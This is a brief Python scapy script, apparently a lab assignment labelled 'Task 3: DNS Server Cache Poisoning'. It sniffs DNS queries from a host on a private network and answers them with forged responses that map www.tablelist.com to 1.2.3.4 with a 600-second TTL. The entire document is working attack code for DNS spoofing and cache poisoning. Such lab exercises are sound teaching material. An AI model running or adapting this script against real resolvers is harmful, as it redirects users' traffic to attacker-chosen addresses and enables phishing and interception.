"""
Task 3: DNS Server Cache Poisoning
"""

from scapy.all import *
import time

sniff(
    filter="udp port 53 and ip src 192.168.56.101 and ip dst not 192.168.56.102",
    prn=lambda p:
        send(
            IP(dst=p[IP].src, src=p[IP].dst)\
            /UDP(dport=p[UDP].sport, sport=p[UDP].dport)\
            /DNS(id=p[DNS].id, an=DNSRR(rrname="www.tablelist.com", rdata="1.2.3.4", ttl=600))
        ))
